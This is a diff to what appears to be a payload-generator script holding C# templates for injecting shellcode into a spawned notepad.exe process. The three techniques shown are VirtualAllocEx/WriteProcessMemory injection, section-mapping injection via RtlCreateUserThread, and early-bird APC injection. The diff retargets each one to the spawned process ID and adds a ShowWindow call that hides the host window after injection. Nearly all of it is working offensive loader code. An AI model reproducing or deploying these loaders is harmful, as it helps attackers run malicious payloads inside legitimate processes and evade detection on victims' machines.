@@ -272,15 +272,15 @@ START_PROCESS_INJECT = """
           ProcessStartInfo start = new ProcessStartInfo();
           start.Arguments = ""; 
           start.FileName = "notepad.exe";
-          start.WindowStyle = ProcessWindowStyle.Hidden;
-          start.CreateNoWindow = true;
+          start.WindowStyle = ProcessWindowStyle.Normal;
+          start.CreateNoWindow = false;
           int exitCode;
           // Run the external process & wait for it to finish
           using (Process proc = Process.Start(start))
           {
-            Process[] expProc = Process.GetProcessesByName("notepad");
-            for (int i = 0; i < expProc.Length; i++) {
-              IntPtr hProcess = OpenProcess(0x001F0FFF, false, expProc[i].Id);
+            if (proc != null) {
+              int pid = proc.Id;
+              IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
               IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
               IntPtr outSize;
               WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
@@ -438,15 +438,15 @@ START_PROCESS_INTERPROCESS_CODE = """
           ProcessStartInfo start = new ProcessStartInfo();
           start.Arguments = ""; 
           start.FileName = "notepad.exe";
-          start.WindowStyle = ProcessWindowStyle.Hidden;
-          start.CreateNoWindow = true;
+          start.WindowStyle = ProcessWindowStyle.Normal;
+          start.CreateNoWindow = false;
           int exitCode;
           // Run the external process & wait for it to finish
           using (Process proc = Process.Start(start))
           {
-              Process target = null;
-              Process[] processes = Process.GetProcessesByName("notepad");
-              target = processes[0];
+              if (proc != null) {
+                int pid = proc.Id;
+              Process target = Process.GetProcessById(pid);
               IntPtr hSectionHandle = IntPtr.Zero;
               IntPtr pLocalView = IntPtr.Zero;
               UInt64 size = (UInt32)shellcode.Length;
@@ -460,6 +460,7 @@ START_PROCESS_INTERPROCESS_CODE = """
               IntPtr hThread = IntPtr.Zero;
               CLIENT_ID cid = new CLIENT_ID();
               RtlCreateUserThread(target.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
+              }
          }
 """
 
@@ -474,6 +475,7 @@ START_PROCESS_EARLYBIRD_IMPORT = f"""
          {PINVOKE["NtWriteVirtualMemory"]}
          {PINVOKE["RtlZeroMemory"]}
          {PINVOKE["WaitForSingleObject"]}
+         {PINVOKE["ShowWindow"]}
 """
 START_PROCESS_EARLYBIRD_IMPORT += """
                 [Flags]
@@ -546,44 +548,43 @@ START_PROCESS_EARLYBIRD_CODE = """
           ProcessStartInfo start = new ProcessStartInfo();
           start.Arguments = ""; 
           start.FileName = "notepad.exe";
-          start.WindowStyle = ProcessWindowStyle.Hidden;
-          start.CreateNoWindow = true;
+          start.WindowStyle = ProcessWindowStyle.Normal;
+          start.CreateNoWindow = false;
           int exitCode;
           // Run the external process & wait for it to finish
           using (Process proc = Process.Start(start))
           {
-            Process[] expProc = Process.GetProcessesByName("notepad");
-            for (int i = 0; i < expProc.Length; i++) {
-            
-            IntPtr Process_handle = OpenProcess((uint)ProcessAccessFlags.All, false, expProc[i].Id);
-            IntPtr VAlloc_address = VirtualAllocEx(
-                Process_handle, 
-                IntPtr.Zero, 
-                (uint)shellcode.Length, 
-                AllocationType.Commit, 
-                AllocationProtect.PAGE_EXECUTE_READWRITE);
-
-            
-            IntPtr shellcode_address = Marshal.AllocHGlobal(shellcode.Length);
-            RtlZeroMemory(shellcode_address, shellcode.Length);
-
-            UInt32 getsize = 0;
-            NTSTATUS ntstatus = NtWriteVirtualMemory(Process_handle, VAlloc_address, shellcode, (uint)shellcode.Length, ref getsize);
-
-            IntPtr Thread_id = IntPtr.Zero;
-            IntPtr Thread_handle = CreateRemoteThread(
-                Process_handle, 
-                IntPtr.Zero, 
-                0, 
-                (IntPtr)0xfff,
-                IntPtr.Zero, 
-                (uint)CreationFlags.CREATE_SUSPENDED, 
-                out Thread_id);
-
-            QueueUserAPC(VAlloc_address, Thread_handle, 0);
-            ResumeThread(Thread_handle);
-            CloseHandle(Process_handle);
-            CloseHandle(Thread_handle);
+            if (proc != null) {
+              int pid = proc.Id;
+              IntPtr Process_handle = OpenProcess((uint)ProcessAccessFlags.All, false, pid);
+              IntPtr VAlloc_address = VirtualAllocEx(
+                  Process_handle, 
+                  IntPtr.Zero, 
+                  (uint)shellcode.Length, 
+                  AllocationType.Commit, 
+                  AllocationProtect.PAGE_EXECUTE_READWRITE);
+    
+              IntPtr shellcode_address = Marshal.AllocHGlobal(shellcode.Length);
+              RtlZeroMemory(shellcode_address, shellcode.Length);
+  
+              UInt32 getsize = 0;
+              NTSTATUS ntstatus = NtWriteVirtualMemory(Process_handle, VAlloc_address, shellcode, (uint)shellcode.Length, ref getsize);
+  
+              IntPtr Thread_id = IntPtr.Zero;
+              IntPtr Thread_handle = CreateRemoteThread(
+                  Process_handle, 
+                  IntPtr.Zero, 
+                  0, 
+                  (IntPtr)0xfff,
+                  IntPtr.Zero, 
+                  (uint)CreationFlags.CREATE_SUSPENDED, 
+                  out Thread_id);
+  
+              QueueUserAPC(VAlloc_address, Thread_handle, 0);
+              ResumeThread(Thread_handle);
+              ShowWindow(proc.MainWindowHandle, 0);
+              CloseHandle(Process_handle);
+              CloseHandle(Thread_handle);
             }
             }
 """
